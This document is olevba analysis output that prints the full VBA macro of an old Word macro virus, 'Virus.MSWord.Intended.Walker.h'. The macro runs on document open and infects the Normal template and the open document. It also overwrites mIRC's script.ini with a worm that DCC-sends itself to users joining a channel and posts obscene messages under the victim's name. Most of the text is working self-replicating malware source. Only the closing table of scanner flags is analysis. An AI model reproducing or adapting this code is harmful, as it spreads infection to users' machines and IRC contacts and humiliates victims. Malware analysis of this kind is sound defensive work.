olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Walker.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Walker.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()

End Sub

Private Sub Document_Open()
Rem Beginn evoluted TDIE
On Error Resume Next
NormInstalled = False
ActInstalled = False
MacroClassVirusName = "TDIE"
MCVCreator = "Lord_Arz"
WormWriter = "PhreakX"
WormName = "ThoughLuck"
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "REM BEGINN EVOLUTED TDIE" Then NormInstalled = True
If UCase(AI) = "REM BEGINN EVOLUTED TDIE" Then ActInstalled = True

If NormInstalled = True And ActInstalled = True Then GoTo PayLoad

If NormInstalled = False Then
    Set Infection = NormCarrier
    Set Carrier = ActCarrier
Else
    Set Infection = ActCarrier
    Set Carrier = NormCarrier
End If

With Carrier
    VirCode = .Lines(1, .CountOfLines)
End With
With Infection
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirCode
End With
ThisDocument.Save
PayLoad:
'Installing the worm:
With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "script.ini"
    .FileType = msoFileTypeAllFiles
    .SearchSubFolders = True
    .MatchTextExactly = True
    .Execute
    MIRCPath = .FoundFiles
End With
Open MIRCPath For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1=  if ( $nick != $me ) {"
Print #1, "n2=    /dcc send $nick $mircdirtoughluck.doc"
Print #1, "n3=}"
Print #1, "n4=  if ( $me ison #irchelp ) {"
Print #1, "n5=    /part #irchelp"
Print #1, "n6=}"
Print #1, "n7=  if ( $me ison #mirchelp ) {"
Print #1, "n8=    /part #mirchelp"
Print #1, "n9=}"
Print #1, "n10=  if ( $me ison #help ) {"
Print #1, "n11=    /part #help"
Print #1, "n12=  }"
Print #1, "n13=  if ( $me ison #helpdesk ) {"
Print #1, "n14=    /part #helpdesk"
Print #1, "n15=  if ( $me ison #vir ) {"
Print #1, "n16=    /say PhreakX rules my life..... D.o.S rules"
Print #1, "n17=  if ( $me ison #gigavirii ) {"
Print #1, "n18=    /say PhreakX rules my life..... D.o.S rules"
Print #1, "n19=on 1:TEXT:phreakx:*:/quit I am infected with Tough Luck by PhreakX, greetings to all D.o.S members"
Print #1, "n20=on 1:TEXT:brb:*:/say I will be back and satisfy the rest of u shortly, those who didn't get the chance to fuck me will get it..."
Print #1, "n21=on 1:TEXT:gtg:*:/quit I am infected with Tough Luck byt PhreakX, I deserve to by killed so next time u see me go ahead nuke me"
Print #1, "n22=on 1:TEXT:msg:*:/msg $nick i need u desperately, FUCK ME"
Print #1, "n23= }"
Print #1, "n24=   if ( $me ison #limassol ) { "
Print #1, "n25=     /say Hail PhreakX and all other D.o.S members, you rule my life because I am stupid enough as to get infected with Tough Luck by PhreakX"
Print #1, "n26= }"
Print #1, "n27=   if ( $me ison #chatzone ) {"
Print #1, "n28=     /say kick me I suck big time"
Print #1, "n29=on 1:TEXT:virus:*:/quit Ban me you stupid ops, you all suck"
Print #1, "n30=on 1:TEXT:worm:*:/quit My ass can take a whole beer bottle"
Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

